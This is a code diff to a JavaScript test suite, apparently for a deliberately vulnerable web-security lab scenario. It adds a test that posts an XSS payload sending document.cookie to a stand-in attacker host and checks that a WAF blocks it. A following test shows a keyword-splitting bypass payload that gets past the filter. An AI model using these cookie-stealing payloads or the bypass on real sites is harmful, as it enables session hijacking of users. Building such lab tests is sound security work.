@@ -137,6 +137,18 @@ async function runComprehensiveTests() {
       "SCENARIO75{403}"
     );
 
+    // Unseparated keyword payloads must be blocked by WAF (forcing obfuscation)
+    const unseparatedPayload = "department=SecOps&message=" + encodeURIComponent("<svg onload=\"fetch('http://attacker.local:8000/steal?c='+window['document']['cookie'])\">");
+    const unseparatedRes = await request("/api/feedback", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: unseparatedPayload
+    });
+    assert(
+      unseparatedRes.status === 403 && unseparatedRes.body.includes("Blocked by WAF"),
+      "WAF blocks unseparated window['document']['cookie'] keywords, forcing obfuscation"
+    );
+
     // WAF bypass with <svg> and bracket-notation cookie access
     const bypassStr = "<svg onload=fetch('http://attacker.local/steal?c='+window['docu'+'ment']['coo'+'kie'])>";
     const bypassPayload = "department=SecOps&message=" + encodeURIComponent(bypassStr);
